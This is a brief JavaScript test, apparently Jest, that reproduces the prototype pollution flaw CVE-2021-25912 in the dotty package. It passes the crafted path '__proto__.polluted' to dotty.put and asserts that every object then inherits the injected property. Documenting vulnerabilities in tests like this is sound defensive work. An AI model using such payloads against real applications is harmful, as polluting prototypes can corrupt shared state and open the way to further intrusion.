//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
test("prototype pollution in dotty", () => {
  expect({}.polluted).toBe(undefined);

  const dotty = require("dotty");
  dotty.put({}, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
